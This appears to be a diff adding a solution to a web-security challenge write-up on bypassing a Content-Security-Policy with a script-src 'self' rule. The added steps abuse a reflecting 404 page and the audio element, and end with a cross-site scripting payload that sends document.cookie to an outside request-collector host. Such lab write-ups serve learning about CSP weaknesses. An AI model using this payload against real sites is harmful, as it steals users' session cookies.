@@ -78,7 +78,36 @@ script-src 'self'
 `media-src` specifies the URLs from which video, audio and text track resources can be loaded from.
 Checking [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/media-src)
 
-TBD
+This one is the hardest and the best.
+1. The 404 page will show up whatever you put in. means this one match `can be problematic if you host JSONP, Angular or user uploaded files.`
+2. Need to understand how `script-src 'self';` works. It means something like `ip:3008/defend-1.js` will be excuted.
+3. Then try to close the tag with `'`
+4. What to do after fetch, window.open, document.location are blocked by CSP? The anwser is `media-src` `new Audio`
+5. Use relative path for the 404 page, also a browser won't block your input for `Phishing`
+6. final anwer is 
+-----
+-----
+-----
+-----
+-----
+-----
+-----
+-----
+-----
+-----
+-----
+-----
+-----
+-----
+-----
+-----
+-----
+-----
+
+
+```
+<script src="/'; new Audio('https://randomname.free.beeceptor.com/' + document.cookie); '"></script>
+```
 
 
 ### Defend
